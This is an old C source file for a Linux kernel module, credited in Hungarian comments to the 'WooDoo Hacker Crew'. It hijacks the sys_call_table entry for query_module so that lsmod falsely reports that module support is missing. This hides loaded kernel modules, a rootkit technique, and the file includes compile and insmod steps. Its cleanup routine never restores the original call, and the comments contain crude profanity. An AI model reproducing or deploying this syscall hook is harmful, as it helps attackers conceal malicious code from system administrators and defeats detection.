
/****************************************************\
* WooDoo Hacker Crew Bemutatja:                      *
* "Variaciok egy hackelt kernelmodulra"              *
*           Masodik resz - Itt a modul, hol a modul? *
******************************************************
* A modul a SYS_query_module kernelhivast irja at,   *
* miszerint elhiteti a programokkal, hogy a kernelben*
* nincs modul support (pedig van:) , es mukodik is.  *
* Igy lehetosegunk van elrejteni kernelmodulokat.    * 
******************************************************
* root@TheCrow[/home/crow/c/kernel]# insmod ide      *
* root@TheCrow[/home/crow/c/kernel]# insmod hide     *
* root@TheCrow[/home/crow/c/kernel]# lsmod           *
* Module                  Size  Used by              *
* lsmod: QM_MODULES: Function not implemented        *
******************************************************
* Forditas: "gcc hide.c -c" v. ha tobb proci van     *
* "gcc hide.c -c -D__SMP__" utana: "insmod hide"     *
******************************************************
* Szereplok:          Kod: Cr0W                      *
*                     SMP: C-GRiNDeR                 *
*                   Teszt: SMiL, Pc2,                *
*            Koszonet meg: Kewl, D3ViL, ubul, perly  *
\****************************************************/                                   


#define MODULE
#define __KERNEL__
#include <linux/config.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/uaccess.h>
#include <linux/vmalloc.h>
#include <linux/smp_lock.h>
#include <asm/pgtable.h>
#include <linux/init.h>
#include <sys/syscall.h>
#include <linux/errno.h>
#include <linux/sched.h>

// put_mod_name deklaralas a kernel/modules.c -bol
static void put_mod_name(char *buf); 

static inline void
put_mod_name(char *buf)
{
        free_page((unsigned long)buf); 
}
        

extern void *sys_call_table[]; // betolcsuk eztet ish.


int megbaszott_kveri(const char *name_user, int which, char *buf, 
                            size_t bufsize, size_t *ret) 
{
        if (which == 0) 
                return 0;

        return -ENOSYS; // megmondom a frankot, 
                        // QM_MODULES nincs is a kernelben

/* 
Ide berakhatod a modules.c -ben levo strukturat hasznalva a sajat 
"listadat", es akkor kicsit  hi-tech -ebb lesz :) Ahhoz azonban at kell
hozni a &modules -t, es meg nehany egyebb fuggvenyt. Egyenlore ez a 
megoldas a GPL-es, es modullistas verzio csak WooDoo belso hasznaltara van.
*/

}

int init_module(void)
{
   sys_call_table[SYS_query_module] = megbaszott_kveri; // atiranyitas
   return(0);
}

void cleanup_module(void)
{    // Na ez a fuggveny se lesz meghivva soha =]
   ; // meg az anyadat akard kliiinupolni      =]
}